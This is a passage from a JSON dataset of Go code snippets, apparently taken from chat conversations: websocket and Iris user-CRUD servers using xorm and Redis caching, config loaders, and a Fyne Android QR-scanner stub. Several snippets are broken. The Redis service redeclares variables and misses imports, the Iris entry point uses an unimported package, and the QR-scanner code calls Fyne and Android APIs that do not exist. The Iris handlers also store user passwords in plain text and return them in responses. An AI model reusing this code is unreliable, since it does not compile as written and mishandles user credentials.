requestsPerSecond)\n\tfmt.Printf(\"Average response time: %v\\n\", avgResponseTime)\n}",
    "filename": "38029136efa9543f092085c872c5c409_7.go"
  },
  {
    "conversation_hash": "d3d26314c97c92eb373862efba70f6f9",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"encoding/json\"\n    \"os\"\n)\n\ntype Config struct {\n    DatabaseType     string `json:\"DatabaseType\"`\n    DatabaseURL      string `json:\"DatabaseURL\"`\n    DatabasePort     string `json:\"DatabasePort\"`\n    DatabaseName     string `json:\"DatabaseName\"`\n    DatabaseUser     string `json:\"DatabaseUser\"`\n    DatabasePassword string `json:\"DatabasePassword\"`\n    WebsocketPort    string `json:\"WebsocketPort\"`\n}\n\nfunc LoadConfig() (*Config, error) {\n    configFile, err := os.Open(\"config.json\")\n    if err != nil {\n        return nil, err\n    }\n    defer configFile.Close()\n\n    decoder := json.NewDecoder(configFile)\n    config := Config{}\n    err = decoder.Decode(&config)\n    if err != nil {\n        return nil, err\n    }\n\n    return &config, nil\n}",
    "filename": "d3d26314c97c92eb373862efba70f6f9_1.go"
  },
  {
    "conversation_hash": "d3d26314c97c92eb373862efba70f6f9",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"time\"\n\n    \"github.com/go-xorm/xorm\"\n    _ \"github.com/denisenkom/go-mssqldb\"\n)\n\ntype User struct {\n    Id        int64     `xorm:\"pk autoincr\"`\n    Name      string    `xorm:\"not null\"`\n    CreatedAt time.Time `xorm:\"created\"`\n    UpdatedAt time.Time `xorm:\"updated\"`\n}\n\nfunc SyncDatabase(engine *xorm.Engine) error {\n    err := engine.Sync2(new(User))\n    if err != nil {\n        return err\n    }\n\n    return nil\n}",
    "filename": "d3d26314c97c92eb373862efba70f6f9_2.go"
  },
  {
    "conversation_hash": "d3d26314c97c92eb373862efba70f6f9",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"time\"\n\n    \"github.com/go-xorm/xorm\"\n)\n\ntype UserService struct {\n    engine *xorm.Engine\n}\n\nfunc NewUserService(engine *xorm.Engine) *UserService {\n    return &UserService{engine: engine}\n}\n\nfunc (us *UserService) CreateUser(name string) (*User, error) {\n    user := &User{Name: name}\n    _, err := us.engine.Insert(user)\n    if err != nil {\n        return nil, err\n    }\n\n    return user, nil\n}\n\nfunc (us *UserService) GetUserById(id int64) (*User, error) {\n    user := &User{Id: id}\n    has, err := us.engine.Get(user)\n    if err != nil {\n        return nil, err\n    }\n    if !has {\n        return nil, nil\n    }\n\n    return user, nil\n}\n\nfunc (us *UserService) GetAllUsers() ([]*User, error) {\n    users := []*User{}\n    err := us.engine.Find(&users)\n    if err != nil {\n        return nil, err\n    }\n\n    return users, nil\n}\n\nfunc (us *UserService) UpdateUser(id int64, name string) error {\n    user := &User{Id: id}\n    has, err := us.engine.Get(user)\n    if err != nil {\n        return err\n    }\n    if !has {\n        return nil\n    }\n\n    user.Name = name\n    user.UpdatedAt = time.Now()\n\n    _, err = us.engine.ID(id).Update(user)\n    if err != nil {\n        return err\n    }\n\n    return nil\n}\n\nfunc (us *UserService) DeleteUser(id int64) error {\n    user := &User{Id: id}\n    _, err := us.engine.Delete(user)\n    if err != nil {\n        return err\n    }\n\n    return nil\n}",
    "filename": "d3d26314c97c92eb373862efba70f6f9_3.go"
  },
  {
    "conversation_hash": "d3d26314c97c92eb373862efba70f6f9",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"encoding/json\"\n    \"fmt\"\n    \"net/http\"\n    \"strconv\"\n\n    \"github.com/gorilla/websocket\"\n)\n\ntype UserController struct {\n    userService *UserService\n}\n\nfunc NewUserController(userService *UserService) *UserController {\n    return &UserController{userService: userService}\n}\n\nfunc (uc *UserController) CreateUser(ws *websocket.Conn, message []byte) error {\n    var request struct {\n        Action string `json:\"action\"`\n        Name   string `json:\"name\"`\n    }\n\n    err := json.Unmarshal(message, &request)\n    if err != nil {\n        return err\n    }\n\n    user, err := uc.userService.CreateUser(request.Name)\n    if err != nil {\n        return err\n    }\n\n    response := struct {\n        Action string `json:\"action\"`\n        User   *User  `json:\"user\"`\n    }{\n        Action: \"create\",\n        User:   user,\n    }\n\n    err = ws.WriteJSON(response)\n    if err != nil {\n        return err\n    }\n\n    return nil\n}\n\nfunc (uc *UserController) GetUserById(ws *websocket.Conn, message []byte) error {\n    var request struct {\n        Action string `json:\"action\"`\n        Id     int64  `json:\"id\"`\n    }\n\n    err := json.Unmarshal(message, &request)\n    if err != nil {\n        return err\n    }\n\n    user, err := uc.userService.GetUserById(request.Id)\n    if err != nil {\n        return err\n    }\n\n    response := struct {\n        Action string `json:\"action\"`\n        User   *User  `json:\"user\"`\n    }{\n        Action: \"get\",\n        User:   user,\n    }\n\n    err = ws.WriteJSON(response)\n    if err != nil {\n        return err\n    }\n\n    return nil\n}\n\nfunc (uc *UserController) GetAllUsers(ws *websocket.Conn, message []byte) error {\n    var request struct {\n        Action string `json:\"action\"`\n    }\n\n    err := json.Unmarshal(message, &request)\n    if err != nil {\n        return err\n    }\n\n    users, err := uc.userService.GetAllUsers()\n    if err != nil {\n        return err\n    }\n\n    response := struct {\n        Action string   `json:\"action\"`\n        Users  []*User `json:\"users\"`\n    }{\n        Action: \"get-all\",\n        Users:  users,\n    }\n\n    err = ws.WriteJSON(response)\n    if err != nil {\n        return err\n    }\n\n    return nil\n}\n\nfunc (uc *UserController) UpdateUser(ws *websocket.Conn, message []byte) error {\n    var request struct {\n        Action string `json:\"action\"`\n        Id     int64  `json:\"id\"`\n        Name   string `json:\"name\"`\n    }\n\n    err := json.Unmarshal(message, &request)\n    if err != nil {\n        return err\n    }\n\n    err = uc.userService.UpdateUser(request.Id, request.Name)\n    if err != nil {\n        return err\n    }\n\n    response := struct {\n        Action string `json:\"action\"`\n        Id     int64  `json:\"id\"`\n        Name   string `json:\"name\"`\n    }{\n        Action: \"update\",\n        Id:     request.Id,\n        Name:   request.Name,\n    }\n\n    err = ws.WriteJSON(response)\n    if err != nil {\n        return err\n    }\n\n    return nil\n}\n\nfunc (uc *UserController) DeleteUser(ws *websocket.Conn, message []byte) error {\n    var request struct {\n        Action string `json:\"action\"`\n        Id     int64  `json:\"id\"`\n    }\n\n    err := json.Unmarshal(message, &request)\n    if err != nil {\n        return err\n    }\n\n    err = uc.userService.DeleteUser(request.Id)\n    if err != nil {\n        return err\n    }\n\n    response := struct {\n        Action string `json:\"action\"`\n        Id     int64  `json:\"id\"`\n    }{\n        Action: \"delete\",\n        Id:     request.Id,\n    }\n\n    err = ws.WriteJSON(response)\n    if err != nil {\n        return err\n    }\n\n    return nil\n}\n\nfunc (uc *UserController) ServeHTTP(w http.ResponseWriter, r *http.Request) {\n    upgrader := websocket.Upgrader{\n        ReadBufferSize:  1024,\n        WriteBufferSize: 1024,\n    }\n\n    ws, err := upgrader.Upgrade(w, r, nil)\n    if err != nil {\n        http.Error(w, \"Could not open websocket connection\", http.StatusBadRequest)\n        return\n    }\n    defer ws.Close()\n\n    for {\n        messageType, message, err := ws.ReadMessage()\n        if err != nil {\n            break\n        }\n\n        switch messageType {\n        case websocket.TextMessage:\n            var request struct {\n                Action string `json:\"action\"`\n            }\n\n            err = json.Unmarshal(message, &request)\n            if err != nil {\n                break\n            }\n\n            switch request.Action {\n            case \"create\":\n                err = uc.CreateUser(ws, message)\n            case \"get\":\n                err = uc.GetUserById(ws, message)\n            case \"get-all\":\n                err = uc.GetAllUsers(ws, message)\n            case \"update\":\n                err = uc.UpdateUser(ws, message)\n            case \"delete\":\n                err = uc.DeleteUser(ws, message)\n            }\n        }\n\n        if err != nil {\n            fmt.Println(err)\n        }\n    }\n}",
    "filename": "d3d26314c97c92eb373862efba70f6f9_4.go"
  },
  {
    "conversation_hash": "d3d26314c97c92eb373862efba70f6f9",
    "code_index": 5,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"net/http\"\n\n    \"github.com/gorilla/mux\"\n)\n\nfunc NewRouter(userController *UserController) http.Handler {\n    router := mux.NewRouter()\n    router.HandleFunc(\"/ws\", userController.ServeHTTP)\n\n    return router\n}",
    "filename": "d3d26314c97c92eb373862efba70f6f9_5.go"
  },
  {
    "conversation_hash": "d3d26314c97c92eb373862efba70f6f9",
    "code_index": 6,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"fmt\"\n    \"log\"\n    \"net/http\"\n    \n    \"github.com/go-xorm/xorm\"\n)\n\nfunc main() {\n    config, err := LoadConfig()\n    if err != nil {\n        log.Fatalf(\"Load config error: %v\", err)\n    }\n\n    engine, err := xorm.NewEngine(config.DatabaseType, fmt.Sprintf(\"server=%s;port=%s;database=%s;user id=%s;password=%s\", config.DatabaseURL, config.DatabasePort, config.DatabaseName, config.DatabaseUser, config.DatabasePassword))\n    if err != nil {\n        log.Fatalf(\"Connect database error: %v\", err)\n    }\n    defer engine.Close()\n\n    if err := SyncDatabase(engine); err != nil {\n        log.Fatalf(\"Sync database error: %v\", err)\n    }\n\n    userService := NewUserService(engine)\n    userController := NewUserController(userService)\n\n    router := NewRouter(userController)\n\n    fmt.Printf(\"Start websocket server on port %s\\n\", config.WebsocketPort)\n    err = http.ListenAndServe(fmt.Sprintf(\":%s\", config.WebsocketPort), router)\n    if err != nil {\n        log.Fatalf(\"Listen and serve error: %v\", err)\n    }\n}",
    "filename": "d3d26314c97c92eb373862efba70f6f9_6.go"
  },
  {
    "conversation_hash": "d3d26314c97c92eb373862efba70f6f9",
    "code_index": 8,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"encoding/json\"\n    \"os\"\n)\n\ntype Config struct {\n    DatabaseType     string `json:\"DatabaseType\"`\n    DatabaseURL      string `json:\"DatabaseURL\"`\n    DatabasePort     string `json:\"DatabasePort\"`\n    DatabaseName     string `json:\"DatabaseName\"`\n    DatabaseUser     string `json:\"DatabaseUser\"`\n    DatabasePassword string `json:\"DatabasePassword\"`\n    WebsocketPort    string `json:\"WebsocketPort\"`\n    MaxIdleConns     int    `json:\"MaxIdleConns\"`\n    MaxOpenConns     int    `json:\"MaxOpenConns\"`\n    RedisURL         string `json:\"RedisURL\"`\n    RedisPassword    string `json:\"RedisPassword\"`\n    RedisDBIndex     int    `json:\"RedisDBIndex\"`\n}\n\nfunc LoadConfig() (*Config, error) {\n    configFile, err := os.Open(\"config.json\")\n    if err != nil {\n        return nil, err\n    }\n    defer configFile.Close()\n\n    decoder := json.NewDecoder(configFile)\n    config := Config{}\n    err = decoder.Decode(&config)\n    if err != nil {\n        return nil, err\n    }\n\n    return &config, nil\n}",
    "filename": "d3d26314c97c92eb373862efba70f6f9_8.go"
  },
  {
    "conversation_hash": "d3d26314c97c92eb373862efba70f6f9",
    "code_index": 9,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"time\"\n\n    \"github.com/go-xorm/xorm\"\n    _ \"github.com/denisenkom/go-mssqldb\"\n)\n\ntype User struct {\n    Id        int64     `xorm:\"pk autoincr\"`\n    Name      string    `xorm:\"not null\"`\n    CreatedAt time.Time `xorm:\"created\"`\n    UpdatedAt time.Time `xorm:\"updated\"`\n}\n\nfunc SyncDatabase(engine *xorm.Engine) error {\n    err := engine.Sync2(new(User))\n    if err != nil {\n        return err\n    }\n\n    return nil\n}",
    "filename": "d3d26314c97c92eb373862efba70f6f9_9.go"
  },
  {
    "conversation_hash": "d3d26314c97c92eb373862efba70f6f9",
    "code_index": 10,
    "language": "Go",
    "libraries": [
      "Redis",
      "database"
    ],
    "code": "package main\n\nimport (\n    \"time\"\n\n    \"github.com/go-xorm/xorm\"\n    \"github.com/gomodule/redigo/redis\"\n)\n\ntype UserService struct {\n    engine *xorm.Engine\n    redis  redis.Conn\n}\n\nfunc NewUserService(engine *xorm.Engine, redisPool *redis.Pool) *UserService {\n    return &UserService{engine: engine, redis: redisPool.Get()}\n}\n\nfunc (us *UserService) CreateUser(name string) (*User, error) {\n    user := &User{Name: name}\n    _, err := us.engine.Insert(user)\n    if err != nil {\n        return nil, err\n    }\n\n    // Cache user data in Redis\n    us.redis.Do(\"SET\", user.Id, user)\n\n    return user, nil\n}\n\nfunc (us *UserService) GetUserById(id int64) (*User, error) {\n    // Check if user data exists in Redis cache first\n    user, err := redis.Bytes(us.redis.Do(\"GET\", id))\n    if err == nil {\n        var u *User\n        err = json.Unmarshal(user, &u)\n        if err == nil {\n            return u, nil\n        }\n    }\n\n    // If user data not found in Redis cache, get it from database\n    user := &User{Id: id}\n    has, err := us.engine.Get(user)\n    if err != nil {\n        return nil, err\n    }\n    if !has {\n        return nil, nil\n    }\n\n    // Cache user data in Redis\n    us.redis.Do(\"SET\", user.Id, user)\n\n    return user, nil\n}\n\nfunc (us *UserService) GetAllUsers() ([]*User, error) {\n    // Check if users data exists in Redis cache first\n    users, err := redis.Bytes(us.redis.Do(\"GET\", \"all-users\"))\n    if err == nil {\n        var u []*User\n        err = json.Unmarshal(users, &u)\n        if err == nil {\n            return u, nil\n        }\n    }\n\n    // If users data not found in Redis cache, get it from database\n    users := []*User{}\n    err := us.engine.Find(&users)\n    if err != nil {\n        return nil, err\n    }\n\n    // Cache users data in Redis\n    jsonUsers, err := json.Marshal(users)\n    if err == nil {\n        us.redis.Do(\"SET\", \"all-users\", jsonUsers)\n    }\n\n    return users, nil\n}\n\nfunc (us *UserService) UpdateUser(id int64, name string) error {\n    user := &User{Id: id}\n    has, err := us.engine.Get(user)\n    if err != nil {\n        return err\n    }\n    if !has {\n        return nil\n    }\n\n    user.Name = name\n    user.UpdatedAt = time.Now()\n\n    _, err = us.engine.ID(id).Update(user)\n    if err != nil {\n        return err\n    }\n\n    // Update user data in Redis cache\n    us.redis.Do(\"SET\", user.Id, user)\n\n    // Invalidate all users data in Redis cache\n    us.redis.Do(\"DEL\", \"all-users\")\n\n    return nil\n}\n\nfunc (us *UserService) DeleteUser(id int64) error {\n    user := &User{Id: id}\n    _, err := us.engine.Delete(user)\n    if err != nil {\n        return err\n    }\n\n    // Remove user data from Redis cache\n    us.redis.Do(\"DEL\", id)\n\n    // Invalidate all users data in Redis cache\n    us.redis.Do(\"DEL\", \"all-users\")\n\n    return nil\n}",
    "filename": "d3d26314c97c92eb373862efba70f6f9_10.go"
  },
  {
    "conversation_hash": "fe2690e399c9afcec4c40de069728b0a",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package config\n\nimport (\n\t\"encoding/json\"\n\t\"io/ioutil\"\n\t\"log\"\n)\n\ntype Config struct {\n\tDbConfig   DbConfig   `json:\"db\"`\n\tRedisConfig RedisConfig `json:\"redis\"`\n}\n\ntype DbConfig struct {\n\tDriver   string `json:\"driver\"`\n\tDsn      string `json:\"dsn\"`\n\tMaxIdle  int    `json:\"maxidle\"`\n\tMaxOpen  int    `json:\"maxopen\"`\n}\n\ntype RedisConfig struct {\n\tHost string `json:\"host\"`\n\tPort string `json:\"port\"`\n}\n\nvar Conf Config\n\nfunc init() {\n\tdata, err := ioutil.ReadFile(\"config.json\")\n\tif err != nil {\n\t\tlog.Fatalf(\"Read config file error: %v\\n\", err)\n\t}\n\terr = json.Unmarshal(data, &Conf)\n\tif err != nil {\n\t\tlog.Fatalf(\"Parse config file error: %v\\n\", err)\n\t}\n}",
    "filename": "fe2690e399c9afcec4c40de069728b0a_1.go"
  },
  {
    "conversation_hash": "fe2690e399c9afcec4c40de069728b0a",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "package model\n\nimport (\n\t\"time\"\n\n\t\"github.com/go-xorm/xorm\"\n\t_ \"github.com/lib/pq\"\n)\n\ntype User struct {\n\tId       int64     `xorm:\"pk autoincr\" json:\"id\"`\n\tUsername string    `xorm:\"unique\" json:\"username\"`\n\tPassword string    `json:\"password\"`\n\tRegTime  time.Time `xorm:\"created\" json:\"reg_time\"`\n}\n\nvar Engine *xorm.Engine\n\nfunc init() {\n\tvar err error\n\tEngine, err = xorm.NewEngine(config.Conf.DbConfig.Driver, config.Conf.DbConfig.Dsn)\n\tif err != nil {\n\t\tlog.Fatalf(\"Create xorm engine error: %v\\n\", err)\n\t}\n\tEngine.SetMaxIdleConns(config.Conf.DbConfig.MaxIdle)\n\tEngine.SetMaxOpenConns(config.Conf.DbConfig.MaxOpen)\n\tif err = Engine.Sync2(new(User)); err != nil {\n\t\tlog.Fatalf(\"Sync database error: %v\\n\", err)\n\t}\n}",
    "filename": "fe2690e399c9afcec4c40de069728b0a_2.go"
  },
  {
    "conversation_hash": "fe2690e399c9afcec4c40de069728b0a",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "package controller\n\nimport (\n\t\"context\"\n\t\"net/http\"\n\t\"strconv\"\n\n\t\"github.com/kataras/iris/v12\"\n\t\"github.com/kataras/iris/v12/websocket\"\n\t\"iris-mvc/model\"\n\t\"iris-mvc/service\"\n)\n\ntype UserController struct {}\n\nfunc (c *UserController) AddUser(ctx iris.Context) {\n\tuser := &model.User{\n\t\tUsername: ctx.FormValue(\"username\"),\n\t\tPassword: ctx.FormValue(\"password\"),\n\t}\n\n\ts := &service.UserService{}\n\tif _, err := s.AddUser(context.Background(), user); err != nil {\n\t\tctx.JSON(iris.Map{\"code\": http.StatusInternalServerError, \"msg\": err.Error()})\n\t} else {\n\t\tctx.JSON(iris.Map{\"code\": http.StatusOK, \"msg\": \"添加成功\", \"data\": user})\n\t}\n}\n\nfunc (c *UserController) GetUsers(ctx iris.Context) {\n\ts := &service.UserService{}\n\tusers, err := s.GetUsers(context.Background())\n\tif err != nil {\n\t\tctx.JSON(iris.Map{\"code\": http.StatusInternalServerError, \"msg\": err.Error()})\n\t} else {\n\t\tctx.JSON(iris.Map{\"code\": http.StatusOK, \"data\": users})\n\t}\n}\n\nfunc (c *UserController) UpdateUser(ctx iris.Context) {\n\tid, _ := strconv.ParseInt(ctx.Params().Get(\"id\"), 10, 64)\n\tuser := &model.User{\n\t\tId:       id,\n\t\tUsername: ctx.FormValue(\"username\"),\n\t\tPassword: ctx.FormValue(\"password\"),\n\t}\n\n\ts := &service.UserService{}\n\tif _, err := s.UpdateUser(context.Background(), user); err != nil {\n\t\tctx.JSON(iris.Map{\"code\": http.StatusInternalServerError, \"msg\": err.Error()})\n\t} else {\n\t\tctx.JSON(iris.Map{\"code\": http.StatusOK, \"msg\": \"修改成功\", \"data\": user})\n\t}\n}\n\nfunc (c *UserController) DeleteUser(ctx iris.Context) {\n\tid, _ := strconv.ParseInt(ctx.Params().Get(\"id\"), 10, 64)\n\n\ts := &service.UserService{}\n\tif _, err := s.DeleteUser(context.Background(), id); err != nil {\n\t\tctx.JSON(iris.Map{\"code\": http.StatusInternalServerError, \"msg\": err.Error()})\n\t} else {\n\t\tctx.JSON(iris.Map{\"code\": http.StatusOK, \"msg\": \"删除成功\"})\n\t}\n}\n\nfunc (c *UserController) SubscribeUsers(ctx iris.Context, ws websocket.Connection) {\n\ts := &service.UserService{}\n\tif err := s.SubscribeUsers(ctx, ws); err != nil {\n\t\tctx.Application().Logger().Errorf(\"websocket error: %v\", err)\n\t}\n}",
    "filename": "fe2690e399c9afcec4c40de069728b0a_4.go"
  },
  {
    "conversation_hash": "fe2690e399c9afcec4c40de069728b0a",
    "code_index": 5,
    "language": "Go",
    "libraries": [],
    "code": "package router\n\nimport (\n\t\"github.com/kataras/iris/v12\"\n\t\"github.com/kataras/iris/v12/websocket\"\n\t\"iris-mvc/controller\"\n\t\"iris-mvc/service\"\n)\n\nfunc NewRouter() *iris.Application {\n\tapp := iris.New()\n\n\tapp.OnErrorCode(iris.StatusInternalServerError, func(ctx iris.Context) {\n\t\tctx.JSON(iris.Map{\"code\": iris.StatusInternalServerError, \"msg\": \"服务器内部错误\"})\n\t})\n\n\tapp.OnErrorCode(iris.StatusBadRequest, func(ctx iris.Context) {\n\t\tctx.JSON(iris.Map{\"code\": iris.StatusBadRequest, \"msg\": \"请求参数错误\"})\n\t})\n\n\tapp.Use(func(ctx iris.Context) {\n\t\tctx.Application().Logger().Infof(\"Request path: %s\", ctx.Path())\n\t\tctx.Next()\n\t})\n\n\tapp.Get(\"/\", func(ctx iris.Context) {\n\t\tctx.JSON(iris.Map{\"code\": iris.StatusOK, \"msg\": \"Hello, World!\"})\n\t})\n\n\tws := websocket.New(websocket.Config{})\n\tapp.Get(\"/ws\", ws.Handler())\n\n\tuserCtrl := &controller.UserController{}\n\tws.Register(\"users\", userCtrl.SubscribeUsers)\n\n\tuser := app.Party(\"/user\")\n\tuser.Post(\"/add\", iris.LimitRequestBodySize(1<<20), userCtrl.AddUser)\n\tuser.Get(\"/list\", userCtrl.GetUsers)\n\tuser.Put(\"/{id:long}\", iris.LimitRequestBodySize(1<<20), userCtrl.UpdateUser)\n\tuser.Delete(\"/{id:long}\", userCtrl.DeleteUser)\n\n\treturn app\n}",
    "filename": "fe2690e399c9afcec4c40de069728b0a_5.go"
  },
  {
    "conversation_hash": "fe2690e399c9afcec4c40de069728b0a",
    "code_index": 6,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"iris-mvc/config\"\n\t\"iris-mvc/router\"\n)\n\nfunc main() {\n\tapp := router.NewRouter()\n\tapp.Run(iris.Addr(\":8080\"), iris.WithoutServerError(iris.ErrServerClosed))\n}",
    "filename": "fe2690e399c9afcec4c40de069728b0a_6.go"
  },
  {
    "conversation_hash": "fe2690e399c9afcec4c40de069728b0a",
    "code_index": 8,
    "language": "Go",
    "libraries": [],
    "code": "package config\n\nimport (\n\t\"encoding/json\"\n\t\"io/ioutil\"\n\t\"log\"\n)\n\ntype Config struct {\n\tDatabase DatabaseConfig `json:\"database\"`\n\tRedis    RedisConfig    `json:\"redis\"`\n}\n\ntype DatabaseConfig struct {\n\tDriver  string `json:\"driver\"`\n\tDSN     string `json:\"dsn\"`\n\tMaxIdle int    `json:\"maxidle\"`\n\tMaxOpen int    `json:\"maxopen\"`\n}\n\ntype RedisConfig struct {\n\tHost string `json:\"host\"`\n\tPort string `json:\"port\"`\n}\n\nvar Conf Config\n\nfunc init() {\n\tdata, err := ioutil.ReadFile(\"config.json\")\n\tif err != nil {\n\t\tlog.Fatalf(\"Read config file error: %v\", err)\n\t}\n\terr = json.Unmarshal(data, &Conf)\n\tif err != nil {\n\t\tlog.Fatalf(\"Parse config file error: %v\", err)\n\t}\n}",
    "filename": "fe2690e399c9afcec4c40de069728b0a_8.go"
  },
  {
    "conversation_hash": "fe2690e399c9afcec4c40de069728b0a",
    "code_index": 9,
    "language": "Go",
    "libraries": [],
    "code": "package model\n\nimport (\n\t\"log\"\n\n\t\"github.com/go-xorm/xorm\"\n\t_ \"github.com/lib/pq\"\n\t\"iris-mvc/config\"\n)\n\ntype User struct {\n\tId       int    `xorm:\"pk autoincr\"`\n\tUsername string `xorm:\"unique\"`\n\tPassword string\n}\n\nvar Engine *xorm.Engine\n\nfunc init() {\n\tvar err error\n\tEngine, err = xorm.NewEngine(config.Conf.Database.Driver, config.Conf.Database.DSN)\n\tif err != nil {\n\t\tlog.Fatalf(\"Create xorm engine error: %v\", err)\n\t}\n\tEngine.SetMaxIdleConns(config.Conf.Database.MaxIdle)\n\tEngine.SetMaxOpenConns(config.Conf.Database.MaxOpen)\n\tif err = Engine.Sync2(new(User)); err != nil {\n\t\tlog.Fatalf(\"Sync database error: %v\", err)\n\t}\n}",
    "filename": "fe2690e399c9afcec4c40de069728b0a_9.go"
  },
  {
    "conversation_hash": "fe2690e399c9afcec4c40de069728b0a",
    "code_index": 10,
    "language": "Go",
    "libraries": [],
    "code": "package service\n\nimport (\n\t\"context\"\n\t\"encoding/json\"\n\t\"fmt\"\n\t\"time\"\n\n\t\"github.com/go-redis/redis/v8\"\n\t\"github.com/go-xorm/xorm\"\n\t\"iris-mvc/config\"\n\t\"iris-mvc/model\"\n)\n\ntype UserService struct{}\n\nfunc (s *UserService) AddUser(ctx context.Context, user *model.User) (int64, error) {\n\tsession := model.Engine.NewSession()\n\tdefer session.Close()\n\n\tif err := session.Begin(); err != nil {\n\t\treturn 0, err\n\t}\n\n\taffected, err := session.Insert(user)\n\tif err != nil {\n\t\tsession.Rollback()\n\t\treturn 0, err\n\t}\n\n\tif err := s.setCache(ctx, fmt.Sprintf(\"user_%d\", user.Id), user); err != nil {\n\t\tsession.Rollback()\n\t\treturn 0, err\n\t}\n\n\tif err := session.Commit(); err != nil {\n\t\treturn 0, err\n\t}\n\n\treturn affected, nil\n}\n\nfunc (s *UserService) GetUsers(ctx context.Context) ([]*model.User, error) {\n\tvar users []*model.User\n\tclient := redis.NewClient(&redis.Options{\n\t\tAddr: config.Conf.Redis.Host + \":\" + config.Conf.Redis.Port,\n\t})\n\tdefer client.Close()\n\n\tval, err := client.Get(ctx, \"users\").Result()\n\tif err != nil && err != redis.Nil {\n\t\treturn nil, err\n\t}\n\tif val != \"\" {\n\t\tif err := json.Unmarshal([]byte(val), &users); err != nil {\n\t\t\treturn nil, err\n\t\t}\n\t\treturn users, nil\n\t}\n\n\tsession := model.Engine.NewSession()\n\tdefer session.Close()\n\n\tif err := session.Find(&users); err != nil {\n\t\treturn nil, err\n\t}\n\n\tif err := s.setCache(ctx, \"users\", users); err != nil {\n\t\treturn nil, err\n\t}\n\n\treturn users, nil\n}\n\nfunc (s *UserService) UpdateUser(ctx context.Context, user *model.User) (int64, error) {\n\tsession := model.Engine.NewSession()\n\tdefer session.Close()\n\n\tif err := session.Begin(); err != nil {\n\t\treturn 0, err\n\t}\n\n\taffected, err := session.ID(user.Id).Update(user)\n\tif err != nil {\n\t\tsession.Rollback()\n\t\treturn 0, err\n\t}\n\n\tif err := s.setCache(ctx, fmt.Sprintf(\"user_%d\", user.Id), user); err != nil {\n\t\tsession.Rollback()\n\t\treturn 0, err\n\t}\n\n\tif err := session.Commit(); err != nil {\n\t\treturn 0, err\n\t}\n\n\treturn affected, nil\n}\n\nfunc (s *UserService) DeleteUser(ctx context.Context, id int) (int64, error) {\n\tsession := model.Engine.NewSession()\n\tdefer session.Close()\n\n\tif err := session.Begin(); err != nil {\n\t\treturn 0, err\n\t}\n\n\tuser := &model.User{Id: id}\n\n\taffected, err := session.ID(id).Delete(user)\n\tif err != nil {\n\t\tsession.Rollback()\n\t\treturn 0, err\n\t}\n\n\tif err := s.delCache(ctx, fmt.Sprintf(\"user_%d\", id)); err != nil {\n\t\tsession.Rollback()\n\t\treturn 0, err\n\t}\n\n\tif err := session.Commit(); err != nil {\n\t\treturn 0, err\n\t}\n\n\treturn affected, nil\n}\n\nfunc (s *UserService) setCache(ctx context.Context, key string, value interface{}) error {\n\tclient := redis.NewClient(&redis.Options{\n\t\tAddr: config.Conf.Redis.Host + \":\" + config.Conf.Redis.Port,\n\t})\n\tdefer client.Close()\n\n\tdata, err := json.Marshal(value)\n\tif err != nil {\n\t\treturn err\n\t}\n\n\treturn client.Set(ctx, key, data, 24*time.Hour).Err()\n}\n\nfunc (s *UserService) delCache(ctx context.Context, key string) error {\n\tclient := redis.NewClient(&redis.Options{\n\t\tAddr: config.Conf.Redis.Host + \":\" + config.Conf.Redis.Port,\n\t})\n\tdefer client.Close()\n\n\treturn client.Del(ctx, key).Err()\n}",
    "filename": "fe2690e399c9afcec4c40de069728b0a_10.go"
  },
  {
    "conversation_hash": "6b0535bc8b0dfdfa32a9fa40b92614e0",
    "code_index": 7,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fyne.io/fyne/v2\"\n\t\"fyne.io/fyne/v2/app\"\n\t\"fyne.io/fyne/v2/container\"\n\t\"fyne.io/fyne/v2/layout\"\n\t\"fyne.io/fyne/v2/widget\"\n\t\"golang.org/x/mobile/app\"\n\t\"golang.org/x/mobile/event/lifecycle\"\n)\n\ntype qrCodeScanner struct {\n\tstatus  *widget.Label\n\tcontent *widget.Label\n}\n\nfunc (q *qrCodeScanner) loadAndroidLib() *app.Asset {\n\tlib, err := fyne.LoadResourceFromPath(\"./lib/QrCodeScanner-release.aar\")\n\tif err != nil {\n\t\tpanic(\"Failed to load Android library\")\n\t}\n\treturn lib\n}\n\nfunc (q *qrCodeScanner) scanQRCode() {\n\tif appStateManager.CurrentState().Focus.Primary().Stage().Driver().Name() != \"android\" {\n\t\tq.status.SetText(\"Scan QR code is only available on Android\")\n\t\treturn\n\t}\n\n\tlib := q.loadAndroidLib()\n\tactivity := appStateManager.CurrentState().Focus.Primary().Stage().Driver().(*app.AndroidDriver).Context\n\tqrCodeScanner := lib.Invoke(\"new\", activity).Get()\n\tonActivityResult := func(requestCode, resultCode int, data *app.Intent) {\n\t\tif resultCode != app.ResultOk {\n\t\t\tq.status.SetText(\"Scan QR code canceled\")\n\t\t\treturn\n\t\t}\n\n\t\tresult := data.Extras().Get(qrCodeScanner.Class().GetPackage().ToString() + \".ScanResult\").String()\n\t\tif result != \"\" {\n\t\t\tq.status.SetText(\"Scan QR code successfully\")\n\t\t\tq.content.SetText(result)\n\t\t} else {\n\t\t\tq.status.SetText(\"Scan QR code failed\")\n\t\t}\n\t}\n\tqrCodeScanner.Call(\"scanQRCode\", app.NewActivityResult(onActivityResult))\n}\n\nfunc newQRCodeScanner() *qrCodeScanner {\n\tstatus := widget.NewLabel(\"\")\n\tstatus.Alignment = fyne.TextAlignCenter\n\tcontent := widget.NewLabel(\"\")\n\tcontent.Alignment = fyne.TextAlignCenter\n\n\tbutton := widget.NewButton(\"Scan QR Code\", func() { q.scanQRCode() })\n\n\treturn &qrCodeScanner{\n\t\tstatus:  status,\n\t\tcontent: 